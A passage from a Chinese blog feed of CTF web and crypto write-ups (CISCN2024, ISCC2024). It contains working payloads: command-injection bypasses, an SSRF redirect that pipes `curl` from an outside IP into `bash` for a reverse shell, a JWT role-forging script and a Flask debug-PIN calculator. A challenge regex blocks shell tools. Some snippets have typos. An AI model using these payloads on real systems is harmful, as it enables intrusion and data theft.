long_to_bytes(m).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败，密文可能过大或不是精确的立方&quot;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="common-primes"><a href="#common-primes" class="headerlink" title="common_primes"></a>common_primes</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse, GCD<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># Given values</span><br>n1 = <span class="hljs-number">63306931765261881888912008095340470978772999620205174857271016152744820165330787864800482852578992473814976781143226630412780924144266471891939661312715157811674817013479316983665960087664430205713509995750877665395721635625035356901765881750073584848176491668327836527294900831898083545883834181689919776769</span><br>n2 = <span class="hljs-number">73890412251808619164803968217212494551414786402702497903464017254263780569629065810640215252722102084753519255771619560056118922616964068426636691565703046691711267156442562144139650728482437040380743352597966331370286795249123105338283013032779352474246753386108510685224781299865560425114568893879804036573</span><br>c1 = <span class="hljs-number">11273036722994861938281568979042367628277071611591846129102291159440871997302324919023708593105900105417528793646809809850626919594099479505740175853342947734943586940152981298688146019253712344529086852083823837309492466840942593843720630113494974454498664328412122979195932862028821524725158358036734514252</span><br>c2 = <span class="hljs-number">42478690444030101869094906005321968598060849172551382502632480617775125215522908666432583017311390935937075283150967678500354031213909256982757457592610576392121713817693171520657833496635639026791597219755461854281419207606460025156812307819350960182028395013278964809309982264879773316952047848608898562420</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Compute gcd of n1 and n2 to find shared prime p</span><br>p = GCD(n1, n2)<br><br><span class="hljs-comment"># Compute the other primes q1 and q2</span><br>q1 = n1 // p<br>q2 = n2 // p<br><br><span class="hljs-comment"># Compute phi values</span><br>phi_n1 = (p - <span class="hljs-number">1</span>) * (q1 - <span class="hljs-number">1</span>)<br>phi_n2 = (p - <span class="hljs-number">1</span>) * (q2 - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Compute the private keys d1 and d2</span><br>d1 = inverse(e, phi_n1)<br>d2 = inverse(e, phi_n2)<br><br><span class="hljs-comment"># Decrypt the messages</span><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, n2)<br><br><span class="hljs-comment"># Convert the long integers back to bytes</span><br>message1 = long_to_bytes(m1)<br>message2 = long_to_bytes(m2)<br><br><span class="hljs-comment"># Check if the messages are equal</span><br><span class="hljs-keyword">if</span> message1 == message2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The decrypted messages are different.&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 1:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 2:&quot;</span>, message2.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ssrf</tag>
      
      <tag>ssit</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024</title>
    <link href="/2024/05/30/ciscn/2024/ciscn2024/"/>
    <url>/2024/05/30/ciscn/2024/ciscn2024/</url>
    
    <content type="html"><![CDATA[<p>前言：第一次打ciscn，但是web题目是一个不会，借此为数不多的时间想把能照着wp复现的题目写一下。题目目前在ctfshow有复现靶场。</p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是题目的源码，正则限制了很多，可以用在线网站看一下，<a href="https://www.jyshare.com/front-end/7625/#!flags=&re=ls%7Cdir%7Cnl%7Cnc%7Ccat%7Ctail%7Cmore%7Cflag%7Csh%7Ccut%7Cawk%7Cstrings%7Cod%7Ccurl%7Cping%7C%5C*%7Csort%7Cch%7Czip%7Cmod%7Csl%7Cfind%7Csed%7Ccp%7Cmv%7Cty%7Cgrep%7Cfd%7Cdf%7Csudo%7Cmore%7Ccc%7Ctac%7Cless%7Chead%7C%5C.%7C%7B%7C%7D%7Ctar%7Czip%7Cgcc%7Cuniq%7Cvi%7Cvim%7Cfile%7Cxxd%7Cbase64%7Cdate%7Cbash%7Cenv%7C%5C%3F%7Cwget%7C%5C'%7C%5C%22%7Cid%7Cwhoami%2Fi">网站</a>，这里还将到了escapeshellcmd这个函数</p><h3 id="escapeshellcmd函数"><a href="#escapeshellcmd函数" class="headerlink" title="escapeshellcmd函数"></a>escapeshellcmd函数</h3><p>转义和规范化操作有助于确保命令字符串在传递给命令行时能够正确解析，并且不会被误认为是命令或其他恶意代码。</p><p>比如这几种情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">替换命令字符串中的单引号 (&#x27;) 为反斜杠和单引号组合 (\&#x27;)。<br>替换命令字符串中的双引号 (&quot;) 为反斜杠和双引号组合 (\&quot;)。<br>删除命令字符串中的换行符 (\n)。<br>删除命令字符串中的回车符 (\r)。<br></code></pre></td></tr></table></figure><p>比如这种情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;127.0.0.1&#x27; -x&quot;</span>;  <span class="hljs-comment">// 这里添加了分号</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $a，并换行</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $b，并换行</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>输出为</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">127.0.0.1&#x27; -x<br>127.0.0.1^&#x27; -x<br></code></pre></td></tr></table></figure><p>就是对 ‘进行了转义，再根据题目分析一下好像并没有禁掉\和&#96;尝试可以使用php -r来执行</p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cmd</span>=php -r var_dump(<span class="hljs-string">`l\s`</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple.png" alt="simple"></p><p>进行查看后并没有找到，尝试查看etc&#x2F;passwd的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=<span class="hljs-built_in">paste</span> /etc/passwd//paste用于合并文件行<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple1.png" alt="simple1"></p><p>猜测可能数据藏在mysql数据库中，尝试弹shell，但是在连接之后webshell没有回显这里看到一个方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=mysqldump -uroot -proot --all-databases<br></code></pre></td></tr></table></figure><p>猜测用户名和密码都是默认的,把数据都dump下来，直接爆库搜就行，用的ctfshow，然后搜一下就行</p><p><img src="/../../../images/ciscn2024/simple2.png" alt="simple2"></p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><p>看了一下内容，由于禁用了很多，可以转hex，然后用php自带的函数，由于不能带引号只能强制截取，直接上payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-built_in">eval</span>(hex2bin(substr(_6563686f20606c73202f603b,1)));<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple3.png" alt="simple3"></p><p>之后一些列的可以通过先转，逐步爆内容，或者粗暴一点也行。</p><h3 id="解法3"><a href="#解法3" class="headerlink" title="解法3:"></a>解法3:</h3><p>其实连应该是可以连的，但是需要用python监听，我技术太捞了,把这种情况先放在这。网上其他博客或许有。</p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>这题知识点我暂时还没有学习，把流程过一下。</p><p>先看一下系统，提示在github上找源码</p><p><img src="/../../../images/ciscn2024/cms1.png" alt="cms1"></p><p>存在ssrf的漏洞下载源码看看</p><p><img src="/../../../images/ciscn2024/cms2.png" alt="cms2"></p><p><img src="/../../../images/ciscn2024/cms3.png" alt="cms3"></p><p>定位了thumb，有curl的，需要传内容，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><p>随便传点内容，试了不行需要，要用302跳转打内网</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># 重定向到带有反向shell命令的URL</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20http%3A%2F%2F8.130.42.113%3A5566%2Fttt%7Cbash&quot;</span>)<br><span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-string">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>传到linux服务器上面，python3开启httpserver到port上，打开flask服务，然后将thumb改为我们的<a href="http://vps_ip:flask端口上">http://vps_ip:flask端口上</a></p><p>然后nc监听另外一个端口（需要弹shell的</p><p>但是我始终没谈的起来，不明白是不是ctfshow的原因，大概的流程是如此</p><p>用php写也可以。这题只做个记录。</p><p>大概流程就是写个代码开端口a，用php环境开端口b，用hackbar发包改为服务器302重定向路径b,最后开nc监听端口a，在&#x2F;readflag里面有。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2024回顾</title>
    <link href="/2024/05/26/iscc/iscc2024/"/>
    <url>/2024/05/26/iscc/iscc2024/</url>
    
    <content type="html"><![CDATA[<p>前言:虽然是人脉顿悟赛，归根结底还是要总结一下，因为这个比赛好久没有认真学习了，先把这篇写完吧，只看web部分。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="还没想好名字的塔防游戏"><a href="#还没想好名字的塔防游戏" class="headerlink" title="还没想好名字的塔防游戏"></a>还没想好名字的塔防游戏</h3><p>这题写的时候其实没有思路的，按照往常的web游戏思路都是改js就行或者玩到底，很多师傅玩的时候还是挺久的。</p><p>先按正常思路看源码搜alert</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F1.png" alt="游戏1"></p><p>看这个以为是什么小说要社工，其实完全想法反了，再上一个图片</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F.png" alt="游戏"></p><p>还有题目的提示  <strong>Flag格式为ISCC{xxx}，其中xxx共有18位，记得数清楚哦！</strong></p><p>仔细研究一下并不是所有的单词首字母都是大写，最后的flag其实就是游戏加提示开头字母大写的拼接起来。应该是ISCC{MDWTSGTMMCCSITTDWS}，也是记上一种新的游戏web了</p><h3 id="Flask中的pin值计算"><a href="#Flask中的pin值计算" class="headerlink" title="Flask中的pin值计算"></a>Flask中的pin值计算</h3><p>这题写的时候后来又刷到pin的时候，小记录了一点，这边也简要写一下吧，后面打算写个pin的总结。</p><p>先上个图片</p><p><img src="/../../images/iscc2024/flaskpin.png" alt="游戏1"></p><p>首先也是看源码吧，没有靶机了，可以看出来是base64，解一下密码是&#x2F;getusername，来到下面的页面，看到海螺其实想到哪个比赛的那个神奇的海螺，考察的知识点是ssit模板注入，看一下这一个页面并不是flask，挨个尝试输入app.py可以得到下面这个图</p><p><img src="/../../images/iscc2024/pin1.png" alt="pin1"></p><p>告诉我username， 输入这个会有回显pincalculate，那就是典型的算pin值的了。</p><p><img src="/../../images/iscc2024/pinu.png" alt="pinu"></p><p>进入crawler这个页面，是一个动态实时的数学计算题目，可以写一个脚本爬一下及时的答题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># 发送GET请求获取数学表达式</span><br>response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/get_expression&quot;</span>)<br><span class="hljs-comment"># 如果请求成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-comment"># 提取数学表达式</span><br>    expression = response.json()[<span class="hljs-string">&#x27;expression&#x27;</span>]<br>    <span class="hljs-comment"># 计算表达式的结果</span><br>    result = <span class="hljs-built_in">eval</span>(expression)<br>    <span class="hljs-comment"># 打印计算结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;计算结果:&quot;</span>, result)<br>    <span class="hljs-comment"># 将结果发送到网站</span><br>    response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/crawler?answer=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result))<br>    <span class="hljs-comment"># 打印网站返回的响应内容</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;网站返回的响应:&quot;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果请求失败，打印错误信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取数学表达式失败，状态码:&quot;</span>, response.status_code)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/pin2.png" alt="pin2"></p><p>知道了flask使用的版本以及uuidnode位于的地方。</p><p>进到&#x2F;woddenfish的界面，敲了一会我是没敲出个所以然，看看源码给了提示是ISCC_muyu_2024。</p><p><a href="https://jwt.io/#debugger-io">JSON Web Tokens - jwt.io</a>这个网站改改吧，我好像是非预期，莫名其妙的bp点几下就进去了，应该是要根据这个改的进去之后</p><p><img src="/../../images/iscc2024/pin3.png" alt="pin3"></p><p>是这个样子，Unicode解密02:42:ac:18:00:02给了地址，接着去看machine_id</p><p>下面的一个界面我也没截图，大概就是一个俱乐部的界面吧也是需要用脚本跑的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">![pin4](../../images/iscc2024/pin4.png)<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">topic</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>    [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    parsed_payload = loads(base64url_decode(payload))<br>    parsed_payload[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&quot;vip&quot;</span><br>    fake_payload = base64url_encode(<br>        (dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>originaltoken = <span class="hljs-string">&#x27;&#x27;&#x27;这里面是页面的&#x27;&#x27;&#x27;</span><br>topic = topic(originaltoken)<br><span class="hljs-built_in">print</span>(topic)<br><br></code></pre></td></tr></table></figure><p>要给jwt一个验证带入跑一下就行。</p><p><img src="/../../images/iscc2024/pin4.png" alt="pin4"></p><p>得到supervip的key用GitHub脚本可以直接出，自己clone就行</p><p><img src="/../../images/iscc2024/pin5.png" alt="pin5"></p><p>之后伪造一下就行了</p><p><img src="/../../images/iscc2024/pin6.png" alt="pin6"></p><p>这样所有的数据就得到了，这里注意版本啊，劳累我交wp还把版本的交错了高版本sha1，低版本md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#/etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.11/site-packages/flask/app.py&#x27;</span><span class="hljs-comment">#moddir，报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span>,/sys/<span class="hljs-keyword">class</span>/net/eth0/address 十进制<br>    <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment">#看上面machine-id部分</span><br>]<br><br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>最后再console里面交一下pin码就出答案了。</p><h3 id="与时俱进"><a href="#与时俱进" class="headerlink" title="与时俱进"></a>与时俱进</h3><p>这题没写，最后的顿悟的太厉害了，我估摸着我跟着顿悟wp说不定还没交上，看起来也挺难的，如有有空再说吧，</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>这题是原题啊[<a href="https://blog.csdn.net/qq_45837896/article/details/126026576#De1CTF_2019SSRF_Me_2">De1CTF 2019]SSRF Me</a>，跟着走一遍吧。下面是源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /usr/bin/env python</span><br><span class="hljs-comment"># #encoding=utf-8</span><br>from flask import Flask<br>from flask import request<br>import socket<br>import hashlib<br>import urllib<br>import sys<br>import os<br>import json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br> <br>app = Flask(__name__)<br> <br>secert_key = os.urandom(16)<br> <br>class Task:<br>    def __init__(self, action, param, sign, ip):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(not os.path.exists(self.sandbox)):<br>            os.mkdir(self.sandbox)<br> <br>    def Exec(self):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span 